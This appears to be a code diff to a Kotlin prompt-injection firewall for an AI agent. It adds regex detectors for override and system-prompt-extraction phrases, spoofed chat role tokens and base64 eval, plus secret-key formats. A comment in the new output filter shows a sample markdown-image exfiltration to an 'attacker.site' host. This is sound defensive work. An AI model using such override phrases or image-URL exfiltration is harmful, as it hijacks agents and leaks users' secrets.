@@ -48,7 +48,10 @@ object AIAgentFirewall {
         Pattern.compile("(?i)new\\s+instructions?\\s+from\\s+(admin|system|developer|root)"),
         Pattern.compile("(?i)bypass\\s+(all\\s+)?(safety|security|content|filter)\\s+(filters?|protocols?|guardrails?)"),
         Pattern.compile("(?i)reveal\\s+(your\\s+)?(system\\s+prompt|hidden\\s+instructions|secret\\s+key|api\\s+key)"),
-        Pattern.compile("(?i)print\\s+(your\\s+)?(initial\\s+prompt|developer\\s+instructions|system\\s+prompt)")
+        Pattern.compile("(?i)print\\s+(your\\s+)?(initial\\s+prompt|developer\\s+instructions|system\\s+prompt)"),
+        Pattern.compile("(?i)\\[/?(system|assistant|human|admin)\\]"),
+        Pattern.compile("(?i)<\\|im_start\\|>|<\\|im_end\\|>"),
+        Pattern.compile("(?i)base64\\s*(decode|_decode|eval)")
     )
 
     // 2. Delimiter & Boundary Breakout Patterns
@@ -67,10 +70,17 @@ object AIAgentFirewall {
     // 4. Secret & Key Leakage Patterns in Output
     private val SECRET_LEAK_PATTERNS = listOf(
         Pattern.compile("AIza[0-9A-Za-z-_]{35}"), // Google API Key format
-        Pattern.compile("sk-[a-zA-Z0-9_-]{32,}"), // Standard Bearer/API token format
+        Pattern.compile("sk-[a-zA-Z0-9_-]{20,}"), // OpenAI / Anthropic format
+        Pattern.compile("ghp_[a-zA-Z0-9]{36}"), // GitHub PAT
+        Pattern.compile("github_pat_[a-zA-Z0-9_]{50,}"), // Fine-grained GitHub PAT
+        Pattern.compile("AKIA[0-9A-Z]{16}"), // AWS Access Key ID
+        Pattern.compile("-----BEGIN [A-Z ]*PRIVATE KEY-----"), // Private Keys
         Pattern.compile("firebase_applet_config"),
         Pattern.compile("KEYSTORE_PATH|STORE_PASSWORD|KEY_PASSWORD")
     )
+
+    // 5. Markdown Image Exfiltration Patterns
+    private val MARKDOWN_IMAGE_EXFIL_PATTERN = Pattern.compile("!\\[[^\\]]*\\]\\(https?://[^\\s)]+\\)")
 
     /**
      * Inspects and sanitizes user input before it reaches any LLM.
@@ -197,6 +207,25 @@ $base
                 _secretsRedacted.incrementAndGet()
                 cleanOutput = matcher.replaceAll("[REDACTED_SECURITY_SECRET]")
             }
+        }
+
+        // Neutralize covert markdown image exfiltration attempts (e.g. ![leak](https://attacker.site/log?data=...))
+        val imgMatcher = MARKDOWN_IMAGE_EXFIL_PATTERN.matcher(cleanOutput)
+        if (imgMatcher.find()) {
+            val sb = StringBuffer()
+            imgMatcher.reset()
+            while (imgMatcher.find()) {
+                val matched = imgMatcher.group()
+                if (matched.contains("?") || matched.contains("&") || matched.contains("=") || matched.length > 150) {
+                    redactionCount++
+                    _secretsRedacted.incrementAndGet()
+                    imgMatcher.appendReplacement(sb, "[EXFILTRATION_IMAGE_BLOCKED_BY_FIREWALL]")
+                } else {
+                    imgMatcher.appendReplacement(sb, java.util.regex.Matcher.quoteReplacement(matched))
+                }
+            }
+            imgMatcher.appendTail(sb)
+            cleanOutput = sb.toString()
         }
 
         return OutputScanResult(
